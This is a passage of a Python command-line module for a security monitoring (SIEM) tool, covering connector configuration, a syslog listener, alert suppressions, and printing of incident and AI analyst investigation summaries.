    """Build a connector config from the poll flags, omitting unset values.

    The API token is read from an environment variable rather than a flag, so
    it never lands in shell history or the process list.
    """
    config: dict[str, Any] = {}
    if getattr(args, "path", None):
        config["path"] = args.path
    if getattr(args, "url", None):
        config["url"] = args.url
    if getattr(args, "org", None):
        config["org"] = args.org
    if getattr(args, "token_env", None):
        config["token_env"] = args.token_env
    if getattr(args, "since", None):
        config["since"] = args.since
    if getattr(args, "limit", None):
        config["limit"] = args.limit
    if getattr(args, "max_pages", None):
        config["max_pages"] = args.max_pages
    state = getattr(args, "state", None)
    if state:
        config["state_path"] = state
    elif getattr(args, "url", None) or getattr(args, "org", None):
        # Default the cursor next to the database so restarts resume cleanly,
        # but keep API endpoints/orgs isolated from one another.
        identity = "|".join([
            str(args.connector),
            str(getattr(args, "url", "") or ""),
            str(getattr(args, "org", "") or ""),
        ])
        suffix = hashlib.sha256(identity.encode("utf-8")).hexdigest()[:12]
        config["state_path"] = str(Path(args.db).parent / f"{args.connector}_{suffix}_cursor.json")
    return config


def _event_search_from_db(db: str | Path) -> RelationalStorage | None:
    """Read-only event searcher for the analyst runtime, or None if no DB yet.

    Deliberately does not create the database file: a first run has no history
    to pivot into, and creating it here would surprise ``--no-save``.
    """
    if os.environ.get("AUTOSIEM_STORAGE", "sqlite").lower() != "sqlite":
        return open_storage(db)
    path = Path(db)
    if not path.exists():
        return None
    try:
        return open_storage(path)
    except Exception:  # a corrupt db must not break a pipeline run
        return None


def _rule_state_from_db(path: str | Path, tenant_id: str | None = None) -> dict[str, bool]:
    """Read persisted rule state without forcing the DB file into existence."""
    if os.environ.get("AUTOSIEM_STORAGE", "sqlite").lower() != "sqlite":
        return open_storage(path).rule_state_dict(tenant_id=tenant_id)
    p = Path(path)
    if not p.exists():
        return {}
    try:
        return open_storage(p).rule_state_dict(tenant_id=tenant_id)
    except Exception:  # corrupt/empty db should never break a pipeline run
        return {}


def _rule_to_dict(rule: DetectionRule) -> dict[str, Any]:
    return {
        "rule_id": rule.rule_id,
        "name": rule.name,
        "description": rule.description,
        "severity": rule.severity.name.lower(),
        "risk_points": rule.risk_points,
        "mitre_attack": rule.mitre_attack,
        "tags": rule.tags,
        "enabled": rule.enabled,
    }


def _run_listener(args: argparse.Namespace) -> None:
    llm = _make_llm(getattr(args, "llm", False))
    store = None if args.no_save else open_storage(args.db)
    engine = load_suppression_engine(store) if store else None
    rules = _rules_with_state(args.rules, _rule_state_from_db(args.db))
    listener_store = _event_search_from_db(args.db)
    pipeline = AutoSIEMPipeline(
        rules,
        llm=llm,
        suppression_engine=engine,
        rag=default_rag_engine(listener_store, tenant_id=DEFAULT_TENANT),
        soar=SoarPlanner(),
        event_search=listener_store,
        tenant_id=DEFAULT_TENANT,
        baseline_store=listener_store,
        enrichment=enrichment_from_env(indicators=load_intel_state(default_intel_state(args.db))),
    )
    
    # Check for distributed mode
    dist_config = distributed_config_from_env()
    dist_pipeline = None
    if dist_config.queue_enabled or dist_config.archive_enabled or dist_config.alternate_backend:
        # Wraps the same pipeline object, so each event is processed once.
        dist_pipeline = DistributedPipeline(
            dist_config, rules, db_path=str(args.db), pipeline=pipeline,
            persist=store.save_pipeline_result if store else None,
            transactional_outbox=os.environ.get("AUTOSIEM_STORAGE", "sqlite").lower() == "postgres",
        )
        # Replay any unacked messages from previous crash
        replay_result = dist_pipeline.replay_from_queue()
        if replay_result.get("replayed", 0) > 0:
            print(f"Replayed {replay_result['replayed']} events from queue")

    def handle(raw: dict[str, Any]) -> None:
        line = json.dumps(raw)
        result = dist_pipeline.run([line]) if dist_pipeline else pipeline.process_lines([line])
        if store and dist_pipeline is None:
            store.save_pipeline_result(result)
        for event in result.events:
            finding_count = sum(1 for finding in result.findings if finding.event_id == event.event_id)
            print(
                f"[{event.timestamp.isoformat()}] {event.category}/{event.action} "
                f"host={event.host or '-'} user={event.user or '-'} findings={finding_count}"
            )

    server = SyslogServer(handle, host=args.host, port=args.port)
    try:
        server.start()
        print(f"Listening for syslog/CEF on udp://{args.host}:{server.port} — Ctrl+C to stop")
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        print("\nListener stopped.")
    finally:
        server.stop()


def load_suppression_engine(store: RelationalStorage, tenant_id: str | None = None) -> SuppressionEngine | None:
    tenant = tenant_id or DEFAULT_TENANT
    rows = store.list_suppressions(enabled_only=True, tenant_id=tenant)
    if not rows:
        return None
    engine = SuppressionEngine()
    for row in rows:
        expires_at = None
        if row.get("expires_at"):
            try:
                expires_at = datetime.fromisoformat(row["expires_at"])
            except ValueError:
                expires_at = None
        engine.add_suppression(
            Suppression(
                suppression_id=row["suppression_id"],
                rule_id=row["rule_id"],
                name=row["name"],
                action=row["action"],
                reason=row["reason"],
                entity=row.get("entity"),
                downgrade_to=row.get("downgrade_to"),
                expires_at=expires_at,
                created_by=row.get("created_by", DEFAULT_CREATED_BY),
                enabled=bool(row.get("enabled", 1)),
            )
        )
    return engine


def _print_pipeline_result(result: PipelineResult, saved: bool, db: str) -> None:
    _print_json({
        "events": len(result.events),
        "findings": len(result.findings),
        "suppressed": len(result.suppressed),
        "saved": saved,
        "db": ("postgres" if os.environ.get("AUTOSIEM_STORAGE", "sqlite").lower() == "postgres" else db) if saved else None,
        "incidents": [
            {
                "id": incident.incident_id,
                "title": incident.title,
                "severity": incident.severity.name.lower(),
                "risk_score": incident.risk_score,
                "entities": incident.entities,
                "mitre_attack": incident.mitre_attack,
                "ai_analyst": _investigation_summary(result, incident.incident_id),
            }
            for incident in result.incidents
        ],
    })
    if result.incidents:
        top = result.incidents[0]
        print("\n=== AI Investigation Report ===")
        print(result.reports[top.incident_id])
        investigation = result.investigations[top.incident_id]
        print("\n=== AI Analyst Runtime ===")
        print(f"Decision: {investigation.decision.decision_type.value} ({investigation.decision.confidence:.2f})")
        print(f"Rationale: {investigation.decision.rationale}")
        print("Tasks:")
        for task in investigation.tasks:
            print(f"- {task.status.value}: {task.name} [{task.action}] - {task.policy_reason}")
        print("Action proposals:")
        for proposal in investigation.action_proposals:
            print(
                f"- id={proposal.proposal_id} {proposal.action} target={proposal.target} "
                f"approval_required={proposal.approval_required} executable_now={proposal.executable_now} "
                f"reason={proposal.policy_reason}"
            )


def _investigation_summary(result: PipelineResult, incident_id: str) -> dict[str, Any] | None:
    investigation = result.investigations.get(incident_id)
    if not investigation:
        return None
    return {
        "status": investigation.status,
        "decision": investigation.decision.decision_type.value,
        "confidence": round(investigation.decision.confidence, 2),
        # Recorded by the pipeline from the call itself, not inferred from the
        # audit log: never claim an LLM was used unless one answered.
        "used_llm": incident_id in result.llm_reports,
        "confidence_source": investigation.decision.confidence_source,
        "proposed_actions": [
            {
                "proposal_id": proposal.proposal_id,
                "action": proposal.action,
                "target": proposal.target,
                "approval_required": proposal.approval_required,
                "executable_now": proposal.executable_now,
            }
            for proposal in investigation.action_proposals
        ],
    }


def _run_postgres_command(args: argparse.Namespace) -> None:
    """Run the PostgreSQL-only subcommands, which read their DSN from the environment."""
    from .postgres import PostgresStorage, dsn_from_env, migrate
    if args.command == "migrate":
        _print_json({"applied": migrate(dsn_from_env())})
        return
    from .projections import projection_from_env
    pg_store = PostgresStorage(dsn_from_env())
    projection = projection_from_env()
    # One document, so the backlog reported after --deliver stays pipeable.
    report: dict[str, Any] = {}
    if args.deliver:
        report.update(pg_store.drain_outbox(projection.destination, projection.deliver, args.limit))
    report.update(pg_store.outbox_stats(projection.destination))
    _print_json(report)


def _print_json(data: Any) -> None:
    print(json.dumps(data, indent=2, sort_keys=True))


if __name__ == "__main__":
    main()
